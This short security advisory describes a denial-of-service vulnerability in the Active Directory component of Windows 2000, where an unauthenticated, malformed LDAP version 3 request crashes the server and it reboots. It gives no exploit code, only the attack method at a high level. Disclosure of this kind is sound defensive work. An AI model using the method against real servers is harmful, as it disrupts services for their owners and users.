A vulnerability has been discovered in Microsoft Windows 2000. The problem occurs in the Active Directory component and will result in a denial of service.

An unauthenticated attacker could exploit this vulnerability by transmitting a malformed LDAP version 3 request to a target Microsoft Windows 2000 server. When the request is processed, an exception will be triggered effectively causing the target server to crash.

An affected system is said to reboot within 30 seconds of the exception being triggered.
